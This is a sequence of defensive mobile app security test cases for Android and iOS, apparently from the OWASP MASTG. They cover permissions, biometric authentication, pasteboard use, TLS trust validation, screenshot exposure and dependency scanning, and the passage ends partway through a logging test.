## Dangerous App Permissions

## Overview

In Android apps, permissions are acquired through different methods to access information and system functionalities, including the camera, location, or storage. The necessary permissions are specified in the `AndroidManifest.xml` file with `<uses-permission>` tags.

## Steps

There are multiple tools that can help in finding permissions in use by an app. Refer @MASTG-TECH-0118 to and use any of the mentioned tools.

1. Extract the `AndroidManifest.xml` file from the APK (see @MASTG-TECH-0117).
2. Obtain the list of declared permissions (see @MASTG-TECH-0126).

## Observation

The output should contain the list of permissions declared by the app.

## Evaluation

The test case fails if there are any dangerous permissions in the app.

Compare the list of declared permissions with the list of [dangerous permissions](https://android.googlesource.com/platform/frameworks/base/%2B/master/core/res/AndroidManifest.xml) defined by Android. You can find more details in the [Android documentation](https://developer.android.com/reference/android/Manifest.permission).

**Context Consideration**:

Context is essential when evaluating permissions. For example, an app that uses the camera to scan QR codes should have the `CAMERA` permission. However, if the app does not have a camera feature, the permission is unnecessary and should be removed.

Also, consider if there are any privacy-preserving alternatives to the permissions used by the app. For example, instead of using the `CAMERA` permission, the app could [use the device's built-in camera app](https://developer.android.com/privacy-and-security/minimize-permission-requests#take-photo) to capture photos or videos by invoking the `ACTION_IMAGE_CAPTURE` or `ACTION_VIDEO_CAPTURE` intent actions. This approach allows the app to access the camera functionality without directly requesting the `CAMERA` permission, thereby enhancing user privacy.
## References to Keyboard Caching Attributes in UI Elements

## Overview

This test verifies that the app appropriately configures text input fields to prevent the keyboard from caching sensitive information, such as passwords or personal data.

Android apps can configure the behavior of text input fields using XML attributes in the layout files or programmatically in the code. If the app doesn't use non-caching input types for sensitive data, the keyboard may cache sensitive information.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0017).
2. Search for XML attributes in the layout files within the `res/layout` directory.
3. Search for calls to the `setInputType` method and the input type values passed to it (@MASTG-TECH-0014).
4. In case the app uses Jetpack Compose, search for calls to [`KeyboardOptions` constructors](https://developer.android.com/reference/kotlin/androidx/compose/foundation/text/KeyboardOptions#public-constructors_1) and their parameters in the reversed code (@MASTG-TECH-0014). Especially `keyboardType` and `autoCorrect`.

## Observation

The output should include:

- All `android:inputType` XML attributes, if using XML for the UI.
- All calls to the `setInputType` method and the input type values passed to it.

## Evaluation

The test case fails if there are any fields handling sensitive data for which the app does not use non-caching input types (see section "Non-Caching Input Types" in @MASTG-KNOW-0055).
## Debuggable Entitlement Enabled in the entitlements.plist

## Overview

The test evaluates whether an iOS application is configured to allow debugging. If an app is debuggable, attackers can leverage debugging tools (see @MASTG-TECH-0084) to analyse the runtime behaviour of the app, and potentially compromise sensitive data or functionality.

## Steps

1. Use @MASTG-TECH-0111 to extract entitlements from the binary.
2. Search for the `get-task-allow` key.

## Observation

The output should contain the value of the `get-task-allow` entitlement.

## Evaluation

The test case fails if the `get-task-allow` entitlement is `true`.
## Logging of StrictMode Violations

## Overview

This test checks whether an app enables [`StrictMode`](../../../Document/0x05i-Testing-Code-Quality-and-Build-Settings.md#strictmode) in production. While useful for developers to log policy violations such as disk I/O or network operations in production apps, leaving `StrictMode` enabled can expose sensitive implementation details in the logs that could be exploited by attackers.

## Steps

1. Install the production build of your app on your device or emulator.
2. Uses @MASTG-TECH-0009 to show the system logs `StrictMode` creates.
3. Open the app and let it execute.

## Observation

The output should contain a list of log statements related to `StrictMode`.

## Evaluation

The test case fails if an app logs any `StrictMode` policy violations.
## References to APIs for Event-Bound Biometric Authentication

## Overview

This test checks if the app insecurely accesses sensitive resources (e.g., tokens, keys) that should be protected by user authentication relying **solely** on the LocalAuthentication API for access control instead of using the Keychain API and requiring user presence.

The **LocalAuthentication** API (e.g., `LAContext`) provides user authentication (Touch ID, Face ID, device passcode), returning only a success or failure result. However, it **does not** securely store secrets or enforce any security. This makes it susceptible to logic manipulation (e.g., bypassing an `if authenticated { ... }` check).

In contrast, the **Keychain** API securely stores sensitive data, and can be configured with access control policies (e.g., require user presence such as biometrics) via `kSecAccessControl` flags. This ensures authentication is not just a one-time boolean, but part of a **secure data retrieval path (out-of-process)**, so bypassing authentication becomes significantly harder.

## Steps

1. Run a static analysis scan with @MASTG-TOOL-0073 to detect usage of `LAContext.evaluatePolicy`
2. Run a static analysis scan with @MASTG-TOOL-0073 to detect usage of Keychain APIs, especially `SecAccessControlCreateWithFlags` (which should go accompanied by other APIs such as `SecItemAdd` and `SecItemCopyMatching`).

## Observation

The output should contain the locations where the `LAContext.evaluatePolicy` and Keychain APIs are used in the codebase (or the lack of their use).

## Evaluation

The test case fails if for each sensitive data resource worth protecting:

- `LAContext.evaluatePolicy` is used explicitly.
- There are no calls to `SecAccessControlCreateWithFlags` requiring user presence with [any of the possible flags](https://developer.apple.com/documentation/security/secaccesscontrolcreateflags).
## Runtime Use Of Event-Bound Biometric Authentication

## Overview

This test is the dynamic counterpart to @MASTG-TEST-0266.

## Steps

1. Use runtime method hooking (see @MASTG-TECH-0095) and look for uses of [LAContext.evaluatePolicy(...)](https://developer.apple.com/documentation/localauthentication/lacontext/evaluatepolicy(_:localizedreason:reply:)) and [`SecAccessControlCreateWithFlags`](https://developer.apple.com/documentation/security/secaccesscontrolcreatewithflags(_:_:_:_:)), including all flags.

## Observation

The output should contain a list of locations where the `LAContext.evaluatePolicy` and `SecAccessControlCreateWithFlags` functions are called including all used flags.

## Evaluation

The test case fails if for each sensitive data resource worth protecting:

- `LAContext.evaluatePolicy` is used explicitly.
- There are no calls to `SecAccessControlCreateWithFlags` requiring user presence with [any of the possible flags](https://developer.apple.com/documentation/security/secaccesscontrolcreateflags).
## References to APIs Allowing Fallback to Non-Biometric Authentication

## Overview

This test checks if the app uses authentication mechanisms that rely on the user's passcode instead of biometrics or allow fallback to device passcode when biometric authentication fails. Specifically, it checks for use of [`kSecAccessControlDevicePasscode`](https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/devicepasscode) or [`kSecAccessControlUserPresence`](https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/userpresence).

The `kSecAccessControlUserPresence` flag is described in the Apple docs as the option that's typically used as it "lets the system choose a mechanism, depending on the current situation". However, this allows fallback to passcode in some cases (e.g. when biometrics aren't configured yet), which is considered weaker than requiring biometrics alone because passcodes are more susceptible to compromise (e.g., through shoulder surfing).

**Note:** This test does not consider [`LAPolicy.deviceOwnerAuthentication`](https://developer.apple.com/documentation/localauthentication/lapolicy/deviceownerauthentication) for LocalAuthentication flows because that shouldn't be used on its own. See @MASTG-TEST-0266.

## Steps

1. Run a static analysis scan using @MASTG-TOOL-0073 to detect usage of `SecAccessControlCreateWithFlags` with the `kSecAccessControlUserPresence` or `kSecAccessControlDevicePasscode` flags.

## Observation

The output should contain a list of locations where relevant APIs are used.

## Evaluation

The test case fails if the app uses `SecAccessControlCreateWithFlags` with the `kSecAccessControlUserPresence` or `kSecAccessControlDevicePasscode` flags for any sensitive data resource that needs protection.

!!! note
    Using `kSecAccessControlUserPresence` or `kSecAccessControlDevicePasscode` is not inherently a vulnerability, but in high-security applications (e.g., finance, government, health), their use can represent a weakness or misconfiguration that reduces the intended security posture. This issue is therefore better categorized as a security weakness or hardening issue, not a critical vulnerability.
## Runtime Use Of APIs Allowing Fallback to Non-Biometric Authentication

## Overview

This test is the dynamic counterpart to @MASTG-TEST-0268.

## Steps

1. Use runtime method hooking (see @MASTG-TECH-0095) and look for uses of [`SecAccessControlCreateWithFlags`](https://developer.apple.com/documentation/security/secaccesscontrolcreatewithflags(_:_:_:_:)) and specific flags.

## Observation

The output should contain a list of locations where the `SecAccessControlCreateWithFlags` function is called including all used flags.

## Evaluation

The test case fails if the app uses `SecAccessControlCreateWithFlags` with the `kSecAccessControlUserPresence` or `kSecAccessControlDevicePasscode` flags for any sensitive data resource that needs protection.
## References to APIs Detecting Biometric Enrollment Changes

## Overview

This test checks whether the app fails to protect sensitive operations against unauthorized access following biometric enrollment changes. An attacker who obtains the device passcode could add a new fingerprint or facial representation via system settings and use it to authenticate in the app.

The test identifies the absence of the [`kSecAccessControlBiometryCurrentSet`](https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/biometrycurrentset) access control flag when storing sensitive items in the Keychain via [`SecAccessControlCreateWithFlags`](https://developer.apple.com/documentation/security/secaccesscontrolcreatewithflags(_:_:_:_:)). This flag ensures that the associated Keychain item becomes inaccessible if the biometric database changes (e.g., when a new fingerprint or face is added). As a result, only users whose biometric data was enrolled at the time the item was created can unlock it, preventing unauthorized access through later-enrolled biometrics.

## Steps

1. Run a static analysis tool such as @MASTG-TOOL-0073 on the app binary and look for uses of [`SecAccessControlCreateWithFlags`](https://developer.apple.com/documentation/security/secaccesscontrolcreatewithflags(_:_:_:_:)) API with [`kSecAccessControlBiometryCurrentSet`](https://developer.apple.com/documentation/security/secaccesscontrolcreateflags/biometrycurrentset) flag.

## Observation

The output should contain a list of locations where relevant APIs are used.

## Evaluation

The test case fails if the app uses `SecAccessControlCreateWithFlags` with any flag except the `kSecAccessControlBiometryCurrentSet` flag for any sensitive data resource worth protecting.
## Runtime Use Of APIs Detecting Biometric Enrollment Changes

## Overview

This test is the dynamic counterpart to @MASTG-TEST-0270.

## Steps

1. Use runtime method hooking (see @MASTG-TECH-0095) and look for uses of [`SecAccessControlCreateWithFlags`](https://developer.apple.com/documentation/security/secaccesscontrolcreatewithflags(_:_:_:_:)) and specific flags.

## Observation

The output should contain a list of locations where the `SecAccessControlCreateWithFlags` function is called including all used flags.

## Evaluation

The test case fails if the app uses `SecAccessControlCreateWithFlags` with any flag except the `kSecAccessControlBiometryCurrentSet` flag for any sensitive data resource worth protecting.
## Identify Dependencies with Known Vulnerabilities in the Android Project

## Overview

In this test case we will identify dependencies in Android Studio and scan them with @MASTG-TOOL-0131.

## Steps

1. Follow @MASTG-TECH-0131 and execute a scan through the build environment of Android Studio by using Gradle.

## Observation

The output should include the dependency and the CVE identifiers for any dependency with known vulnerabilities.

## Evaluation

The test case fails if you can find dependencies with known vulnerabilities.
## Identify Dependencies with Known Vulnerabilities by Scanning Dependency Managers

## Overview

In this test case we are identifying dependencies with known vulnerabilities in iOS. Dependencies are integrated through dependency managers, and there might be one or more of them being used. We therefore need all of the relevant artifacts created by them to analyse them with a SCA scanning tool.

## Steps

1. In order to do this in the most efficient way you would need to ask the developer(s) which dependency managers are being used and to share the relevant file(s) created by them. Follow @MASTG-TECH-0133 for on overview of the package managers and request for the relevant files.

2. Run a SCA analysis tool such as @MASTG-TOOL-0131 against the file(s) created by the dependency manager(s) and look for the use of vulnerable dependencies.

## Observation

The output should include the dependency name and the CVE identifiers for any dependency with known vulnerabilities.

## Evaluation

The test case fails if you can find dependencies with known vulnerabilities.
## Dependencies with Known Vulnerabilities in the App's SBOM

## Overview

In this test case we are identifying dependencies with known vulnerabilities by relying on a Software Bill of Material (SBOM).

## Steps

1. Either ask the development team to share a SBOM in CycloneDX format, or, if you have access to the original source code, create one following @MASTG-TECH-0130.
2. Upload the SBOM to @MASTG-TOOL-0132.
3. Inspect the @MASTG-TOOL-0132 project for the use of vulnerable dependencies.

## Observation

The output should include a list of dependencies with names and CVE identifiers, if any.

## Evaluation

The test case fails if you can find dependencies with known vulnerabilities.
## Dependencies with Known Vulnerabilities in the App's SBOM

## Overview

This test case checks for dependencies with known vulnerabilities in iOS applications by using a Software Bill of Materials (SBOM). The SBOM should be in CycloneDX format, which is a standard for describing the components and dependencies of software.

## Steps

1. Either ask the development team to share a SBOM in CycloneDX format, or, if you have access to the original source code, create one following @MASTG-TECH-0132.
2. Upload the SBOM to @MASTG-TOOL-0132.
3. Inspect the @MASTG-TOOL-0132 project for the use of vulnerable dependencies.

## Observation

The output should include a list of dependencies with names and CVE identifiers, if any.

## Evaluation

The test case fails if you can find dependencies with known vulnerabilities.
## Use of the iOS General Pasteboard

## Overview

This test checks whether the app uses the systemwide general @MASTG-KNOW-0083, which is persistent across device restarts and app uninstalls and is accessible by all foreground apps and, in some cases, other devices. Placing sensitive data here may pose a privacy risk.

The test statically analyzes the code for use of the general pasteboard ([`UIPasteboard.general`](https://developer.apple.com/documentation/uikit/uipasteboard/general)) and checks whether sensitive data is written using any of the following methods:

- [`addItems`](https://developer.apple.com/documentation/uikit/uipasteboard/additems(_:))
- [`setItems`](https://developer.apple.com/documentation/uikit/uipasteboard/setitems(_:options:))
- [`setData`](https://developer.apple.com/documentation/uikit/uipasteboard/setdata(_:forpasteboardtype:))
- [`setValue`](https://developer.apple.com/documentation/uikit/uipasteboard/setvalue(_:forpasteboardtype:))

## Steps

1. Run a static analysis scan using @MASTG-TOOL-0073 to detect usage of the general pasteboard.
2. Run a static analysis scan using @MASTG-TOOL-0073 to detect usage of the pasteboard methods which may be handling sensitive data.

## Observation

The output should contain a list of locations where relevant APIs are used.

## Evaluation

The test case fails if calls are made to `UIPasteboard.generalPasteboard` and sensitive data is written to it.

Since determining what constitutes sensitive data is context-dependent, it can be difficult to detect statically. To check if sensitive data is being written to the pasteboard using the aforementioned methods, inspect the reported code locations in the reverse-engineered code (see @MASTG-TECH-0076).
## Sensitive Data in the iOS General Pasteboard at Runtime

## Overview

This test is the dynamic counterpart to @MASTG-TEST-0276.

In this case we'll monitor the @MASTG-KNOW-0083 for sensitive data being written to it at runtime. Note that this can be challenging to detect, as it requires the app to be running and the pasteboard to be modified while the test is being executed. You can trigger the pasteboard by manually entering sensitive data into the app, such as passwords or personal information, while the test is running. Or you can do it automatically by using a script that simulates user input or modifies the pasteboard directly.

## Steps

1. Monitor the pasteboard for sensitive data using @MASTG-TECH-0134.
2. Run the app and perform actions that may write sensitive data to the pasteboard, such as copying passwords or personal information.

## Observation

The output should contain a list of pasteboard items that were written during the test.

## Evaluation

The test case fails if sensitive data is traced during a write operation to the general pasteboard specifically.
## Pasteboard Contents Not Cleared After Use

## Overview

This test checks if the app clears the contents of the general @MASTG-KNOW-0083 when it moves to the background or terminates. If sensitive data is left in the pasteboard, it can be accessed by other apps, leading to potential data leaks.

Apps can clear the contents of the general pasteboard by setting `UIPasteboard.general.items = []` in the appropriate lifecycle methods, such as `applicationDidEnterBackground:` or `applicationWillTerminate:`.

## Steps

1. Run a static analysis scan using @MASTG-TOOL-0073 to detect usage of the [`UIPasteboard.general`](https://developer.apple.com/documentation/uikit/uipasteboard/1622106-generalpasteboard "UIPasteboard generalPasteboard") property.
2. Run a static analysis scan using @MASTG-TOOL-0073 to detect usage of the [`UIPasteboard.setItems`](https://developer.apple.com/documentation/uikit/uipasteboard/setitems(_:options:) "UIPasteboard setItems") method.

## Observation

The output should contain a list of locations where relevant APIs are used.

## Evaluation

The test case fails if the app uses the general pasteboard and does not clear its contents when moving to the background or terminating. Specifically, it should be verified that there are calls to `UIPasteboard.setItems` with an empty array (`[]`) in the appropriate lifecycle methods.
## Pasteboard Contents Not Expiring

## Overview

This test checks if the app sets an expiration date for the contents of the general @MASTG-KNOW-0083 using the `UIPasteboard.setItems(_:options:)` method with the `UIPasteboard.Options.expirationDate` option. If sensitive data is left in the pasteboard without an expiration date, it can be accessed by other apps indefinitely, leading to potential data leaks.

## Steps

1. Run a static analysis scan using @MASTG-TOOL-0073 to detect usage of the [`UIPasteboard.general`](https://developer.apple.com/documentation/uikit/uipasteboard/1622106-generalpasteboard "UIPasteboard generalPasteboard") property.
2. Run a static analysis scan using @MASTG-TOOL-0073 to detect usage of the `UIPasteboard.setItems(_:options:)` method.

## Observation

The output should contain a list of locations where relevant APIs are used.

## Evaluation

The test case fails if the app uses the general pasteboard without setting an expiration date for its contents. Specifically, ensure that the `UIPasteboard.setItems(_:options:)` method is called with the `UIPasteboard.Options.expirationDate` option.
## Pasteboard Contents Not Restricted to Local Device

## Overview

This test checks if the app restricts the contents of the general @MASTG-KNOW-0083 to the local device by using the `UIPasteboard.setItems(_:options:)` method with the `UIPasteboard.OptionsKey.localOnly` option. If sensitive data is placed in the general pasteboard without this restriction, it can be synced across devices via Universal Clipboard, leading to potential data leaks.

## Steps

1. Run a static analysis scan using @MASTG-TOOL-0073 to detect usage of the [`UIPasteboard.general`](https://developer.apple.com/documentation/uikit/uipasteboard/1622106-generalpasteboard "UIPasteboard generalPasteboard") property.
2. Run a static analysis scan using @MASTG-TOOL-0073 to detect usage of the `UIPasteboard.setItems(_:options:)` method.

## Observation

The output should contain a list of locations where relevant APIs are used.

## Evaluation

The test case fails if the app uses the general pasteboard without restricting its contents to the local device. Specifically, ensure that the `UIPasteboard.setItems(_:options:)` method is called with the `UIPasteboard.Options.localOnly` option.
## Undeclared Known Tracking Domains

## Overview

This test identifies whether the app properly declares all known tracking domains it may communicate with in the [`NSPrivacyTrackingDomains`](https://developer.apple.com/documentation/bundleresources/app-privacy-configuration/nsprivacytrackingdomains) section of its [Privacy Manifest](https://developer.apple.com/documentation/bundleresources/privacy_manifest_files) files.

To perform this test, use one or more curated lists of known trackers. These lists include domains and identifiers associated with advertising networks, analytics providers, and user profiling services. They are commonly used in privacy-focused tools and browsers to detect and block tracking behavior.

Some example lists:

- **[DuckDuckGo iOS Trackers](https://github.com/duckduckgo/tracker-blocklists/blob/main/web/v5/ios-tds.json)**: Includes domains, matching rules, descriptions, and categories such as "Action Pixels," "Ad Fraud," "Ad Motivated Tracking," and "Advertising."
- **[Exodus Privacy Trackers](https://reports.exodus-privacy.eu.org/en/trackers/)**: Includes tracker names, categories (e.g., "Advertisement," "Analytics," "Profiling"), descriptions, and detection metadata such as network and code signatures.

These references can be used to match hardcoded or dynamically accessed domains within your app and verify whether appropriate declarations exist in the Privacy Manifest.

## Steps

1. Extract the app's privacy manifest files, including those from third-party SDKs or frameworks using @MASTG-TECH-0136.
2. Obtain the list of declared tracking domains from the privacy manifest files using @MASTG-TECH-0137.
3. Run a static analysis scan using @MASTG-TOOL-0073:
    - Search for hardcoded references to known tracking domains.
    - Identify code references to well-known tracking libraries.
4. Perform network analysis with @MASTG-TOOL-0097:
    - Intercept and log all outbound network traffic.
    - Extract all domain names contacted during runtime.

## Observation

The output should contain:

- All extracted privacy manifests from the app.
- A list of declared tracking domains from the `NSPrivacyTrackingDomains` key in the manifests (preferably with associated components).
- A list of all domains contacted during dynamic testing.
- A list of code matches for known tracking domains or tracking libraries from static analysis.

## Evaluation

The test case fails if any of the following is missing in the privacy manifest files' `NSPrivacyTrackingDomains` key for the app or any of its components (Frameworks, Plugins, etc.):

- Tracking domains contacted by the app at runtime.
- Tracking domains found in the code.
- Domains corresponding to tracking SDKs found in the code.
## Unsafe Custom Trust Evaluation

## Overview

This test evaluates whether an Android app uses [`checkServerTrusted(...)`](https://developer.android.com/reference/javax/net/ssl/X509TrustManager#checkServerTrusted%28java.security.cert.X509Certificate[],%20java.lang.String%29) [in an unsafe manner](https://developer.android.com/privacy-and-security/risks/unsafe-trustmanager) as part of a custom `TrustManager`, causing any connection configured to use that `TrustManager` to skip certificate validation.

Such unsafe implementations can allow an attacker to run a [MITM attack](../../../Document/0x04f-Testing-Network-Communication.md#intercepting-network-traffic-through-mitm) with a valid (or self-signed) certificate and intercept or tamper with the app's traffic.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0017).
2. Run a static analysis (@MASTG-TECH-0014) tool for the app and look for all usages of `checkServerTrusted(...)`.

## Observation

The output should contain a list of locations where `checkServerTrusted(...)` is used.

## Evaluation

The test case fails if `checkServerTrusted(...)` is implemented in a custom `X509TrustManager` and does **not** properly validate server certificates.

This includes cases such as:

- **Using `checkServerTrusted(...)` which is error prone, when NSC would be enough.
- **Trust manager that does nothing:** overriding `checkServerTrusted(...)` to accept all certificates without any validation, for example by returning immediately without verifying the certificate chain or by always returning `true`.
- **Ignoring errors:** failing to [throw proper exceptions](https://support.google.com/faqs/answer/6346016) (e.g. [`CertificateException`](https://developer.android.com/reference/java/security/cert/CertificateException.html) or [`IllegalArgumentException`](https://developer.android.com/reference/java/lang/IllegalArgumentException)) on validation failure, or catching and suppressing them.
- **Using [`checkValidity()`](https://developer.android.com/reference/java/security/cert/X509Certificate#checkValidity()) instead of full validation:** relying only on `checkValidity()` checks whether the certificate is expired or not yet valid, but does **not** verify trust or hostname matching.
- **Explicitly loosening trust:** disabling trust checks to accept self-signed or untrusted certificates for convenience during development or testing.
- **Misusing [`getAcceptedIssuers()`](https://developer.android.com/reference/javax/net/ssl/X509TrustManager#getAcceptedIssuers())**: Returning `null` or an empty array without proper handling may effectively disable issuer validation.

When testing using automated tools, you will need to inspect all the reported locations in the reverse-engineered code to confirm the incorrect implementation (@MASTG-TECH-0023).
## Incorrect Implementation of Server Hostname Verification

## Overview

This test evaluates whether an Android app implements a [`HostnameVerifier`](https://developer.android.com/reference/javax/net/ssl/HostnameVerifier) that uses [`verify(...)`](https://developer.android.com/reference/javax/net/ssl/HostnameVerifier#verify(java.lang.String,%20javax.net.SSL.SSLSession)) [in an unsafe manner](https://developer.android.com/privacy-and-security/risks/unsafe-hostname), effectively turning off hostname validation for the affected connections.

Such unsafe implementations can allow an attacker to run a [MITM attack](../../../Document/0x04f-Testing-Network-Communication.md#intercepting-network-traffic-through-mitm) with a valid (or self-signed) certificate and intercept or tamper with the app's traffic.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0017).
2. Inspect the source code and run a static analysis (@MASTG-TECH-0014) tool and look for all usages of `HostnameVerifier`.

## Observation

The output should contain a list of locations where `HostnameVerifier` is used.

## Evaluation

The test case fails if the app does **not** properly validate that the server's hostname matches the certificate.

This includes cases such as:

- **Always accepting hostnames:** overriding `verify(...)` to unconditionally return `true`, regardless of the actual hostname or certificate.
- **Overly broad matching rules:** using permissive wildcard logic that matches unintended domains.
- **Incomplete verification coverage:** failing to invoke hostname verification on all SSL/TLS channels, such as those created via `SSLSocket`, or during renegotiation.
- **Missing manual verification:** not performing hostname verification when it is not done automatically, such as when using the low-level `SSLSocket` API.

When testing using automated tools, you will need to inspect all the reported locations in the reverse-engineered code to confirm the incorrect implementation (@MASTG-TECH-0023).
## Incorrect SSL Error Handling in WebViews

## Overview

This test evaluates whether an Android app has WebViews that ignore SSL/TLS certificate errors by overriding the [`onReceivedSslError(...)`](https://developer.android.com/reference/android/webkit/WebViewClient#onReceivedSslError%28android.webkit.WebView,%20android.webkit.SslErrorHandler,%20android.net.http.SslError%29) method without proper validation.

The method `onReceivedSslError(...)` is triggered when a `WebView` encounters an SSL certificate error while loading a page. By default, the `WebView` cancels the request to protect users from insecure connections. Overriding this method and calling [`SslErrorHandler.proceed()`](https://developer.android.com/reference/android/webkit/SslErrorHandler#proceed%28%29) without proper validation disables these protection.

This effectively bypasses SSL certificate checks in the `WebView`, exposing the app to [MITM attacks](../../../Document/0x04f-Testing-Network-Communication.md#intercepting-network-traffic-through-mitm) using invalid, expired, or self-signed certificates.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0017).
2. Inspect the source code and run a static analysis (@MASTG-TECH-0014) tool and look for all usages of `onReceivedSslError(...)`.

## Observation

The output should contain a list of locations where `onReceivedSslError(...)` that includes a `proceed()` is used without exception handling that properly handles SSL errors.

## Evaluation

The test case fails if `onReceivedSslError(...)` is overridden and certificate errors are ignored without proper validation or user involvement.

This includes cases such as:

- **Unconditionally accepting SSL errors:** calling `proceed()` without checking the nature of the error.
- **Relying only on primary error code:** using [`getPrimaryError()`](https://developer.android.com/reference/android/net/http/SslError#getPrimaryError()) for decision-making, such as proceeding if the primary error is not `SSL_UNTRUSTED`, which may overlook additional errors in the chain.
- **Suppressing exceptions silently:** catching exceptions in `onReceivedSslError(...)` without calling [`cancel()`](https://developer.android.com/reference/android/webkit/SslErrorHandler#cancel()), which allows the connection to continue silently.

According to [official Android guidance](https://developer.android.com/reference/android/webkit/WebViewClient.html#onReceivedSslError(android.webkit.WebView,%20android.webkit.SslErrorHandler,%20android.net.http.SslError)), apps should never call `proceed()` in response to SSL errors. The correct behavior is to cancel the request to protect users from potentially insecure connections. User prompts are also discouraged, as users cannot reliably evaluate SSL issues.

When testing using automated tools, you will need to inspect all the reported locations in the reverse-engineered code to confirm the incorrect implementation (@MASTG-TECH-0023).
## Outdated Android Version Allowing Trust in User-Provided CAs

## Overview

This test evaluates whether an Android app **implicitly** trusts user-added CA certificates by [default](https://developer.android.com/privacy-and-security/security-config#CustomTrust), which is the case for apps that can be installed to devices running API level 23 or lower.

Those apps rely on the default Network Security Configuration that trusts both system and user-installed Certificate Authorities (CAs). Such trust can expose the app to [MITM attacks](../../../Document/0x04f-Testing-Network-Communication.md#intercepting-network-traffic-through-mitm), as malicious CAs installed by users could intercept secure communications.

## Steps

1. Obtain the AndroidManifest.xml (@MASTG-TECH-0117).
2. Read the value of the `minSdkVersion` attribute from the `<uses-sdk>` element.

## Observation

The output should contain the value of `minSdkVersion`.

## Evaluation

The test case fails if `minSdkVersion` is less than 24.
## Network Security Configuration Allowing Trust in User-Provided CAs

## Overview

This test evaluates whether an Android app **explicitly** trusts user-added CA certificates by including [`<certificates src="user"/>`](https://developer.android.com/privacy-and-security/security-config#certificates) in its [Network Security Configuration](https://developer.android.com/privacy-and-security/security-config#CustomTrust). Even though starting with Android 7.0 (API level 24) apps no longer trust user-added CAs by default, this configuration overrides that behavior.

Such trust can expose the application to [MITM attacks](../../../Document/0x04f-Testing-Network-Communication.md#intercepting-network-traffic-through-mitm), as malicious CAs installed by users could intercept secure communications.

## Steps

1. Obtain the AndroidManifest.xml (@MASTG-TECH-0117).
2. Check if an [`android:networkSecurityConfig`](https://developer.android.com/guide/topics/manifest/application-element#networkSecurityConfig) attribute is set in the `<application>` tag.
3. Inspect the referenced Network Security Configuration file, and extract all uses of `<certificates src="user" />`.

## Observation

The output should contain all the `<trust-anchors>` from the Network Security Configuration file along with any defined `<certificates>` entries, if present.

## Evaluation

The test case fails if `<certificates src="user" />` has been defined as part of the `<trust-anchors>` in the Network Security Configuration file.
## Debugging Symbols in Native Binaries

## Overview

This test checks whether the app includes debugging symbols in its native binaries. Debugging symbols can provide valuable information during reverse engineering and vulnerability analysis by exposing sensitive implementation details such as function names, variable names, and source file references.

## Steps

1. Run a static analysis (@MASTG-TECH-0140) to retrieve any debugging information present in the native binaries.

## Observation

The output should identify all instances of debugging information in the native binaries.

## Evaluation

The test case fails if debugging information is present in any native binary, including if actual debugging symbols were successfully extracted.
## Runtime Verification of Sensitive Content Exposure in Screenshots During App

## Overview

This test verifies that the app hides sensitive content from the screen when it moves to the background. This is important because Android captures a task screenshot of the app UI when it moves to the background. This screenshot is used for the [Recents screen](https://developer.android.com/guide/components/activities/recents) and transitions, and can expose sensitive content if the app does not protect it.

## Steps

1. Exercise your app until you get to each of the screens identified as sensitive. While on each of those screens, move the app to the background (for example by pressing **Home** or opening the **Recents screen** and exiting it) and continue to the next screen.
2. Once finished, use @MASTG-TECH-0002 to copy the screenshot taken by the system to your laptop for further analysis. The system stores the screenshots in their containers `/data/system_ce/0/snapshots` or `/data/system`.

## Observation

The output should include a collection of screenshots cached when the app entered the background state.

## Evaluation

The test case fails if any screenshot displays sensitive data that should have been protected.
## Runtime Verification of Sensitive Content Exposure in Screenshots During App

## Overview

This test verifies that the app hides sensitive content from the screen when it moves to the background. This is important because iOS captures a snapshot of the app UI when it transitions to the background. This snapshot is used for the [App Switcher](https://support.apple.com/guide/iphone/switch-between-open-apps-iph1a1f981ad/ios) and transitions, and can expose sensitive content if the app does not protect it.

## Steps

1. Exercise your app until you get to each of the screens identified as sensitive. While on each of those screens, move the app to the background (for example by pressing **Home** or opening the **App Switcher** and exiting it) and continue to the next screen.
2. Once finished, use @MASTG-TECH-0053 to copy the snapshots taken by the system to your analysis workstation. The system stores them under `/var/mobile/Containers/Data/Application/<APP_ID>/Library/SplashBoard/Snapshots/sceneID:<APP_NAME>-default/`. Note that the exact path and structure may vary across iOS versions.

## Observation

The output should include a collection of snapshots cached when the app entered the background state.

## Evaluation

The test case fails if any snapshot displays sensitive data that should have been protected.
## References to Screen Capturing Prevention APIs

## Overview

This test verifies whether an app references Android screen capture prevention APIs. On Android, developers can prevent screenshots and nonsecure display mirroring using [`FLAG_SECURE`](https://developer.android.com/security/fraud-prevention/activities#flag_secure). When set, Android blocks screenshots and prevents content from appearing on a nonsecure display, including remote screen sharing. Users see a blank screen if they attempt a screenshot or when the app moves to the background.

Developers typically apply the flag with [`addFlags()`](https://developer.android.com/reference/android/view/Window#addFlags(int)) or [`setFlags()`](https://developer.android.com/reference/android/view/Window#setFlags(int,int)). Common failure modes include not setting `FLAG_SECURE` on all sensitive screens or clearing the flag during transitions e.g., using [`clearFlags()`](https://developer.android.com/reference/android/view/Window#clearFlags(int)) or `setFlags()`.

## Steps

1. Run a static analysis (@MASTG-TECH-0014) tool to identify instances of the relevant APIs.

## Observation

The output should include a list of locations where the relevant APIs are used.

## Evaluation

The test case fails if the relevant APIs are missing or inconsistently applied on any UI component that displays sensitive data, or if code paths clear the protection without an adequate justification.
## GMS Security Provider Not Updated

## Overview

This test checks whether the Android app ensures the Security Provider is [updated to mitigate SSL/TLS vulnerabilities](https://developer.android.com/privacy-and-security/security-gms-provider). The provider should be updated using Google Play Services APIs, and the implementation should handle exceptions properly.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0017).
2. Use static analysis (@MASTG-TECH-0014) to search for usage of `ProviderInstaller.installIfNeeded` or `ProviderInstaller.installIfNeededAsync`.

## Observation

The output should list all locations where the Security Provider update is performed and how exceptions are handled (for `installIfNeeded`), or how the `ProviderInstallListener` handles errors (for `installIfNeededAsync`).

## Evaluation

The test case fails if the app does not update the provider, or it does not handle exceptions properly. Check that these calls occur before any network connections are made.
## Sensitive Data Exposure Through Insecure Logging

## Overview

This test is the dynamic counterpart to @MASTG-TEST-0297.

In this test, we will monitor and capture the device logs and then analyze them for sensitive data.

!!! warning Limitation
    - Linking the logs back to specific locations in the app can be difficult and requires manual analysis of the code. As an alternative you can use dynamic analysis with @MASTG-TOOL-0039.
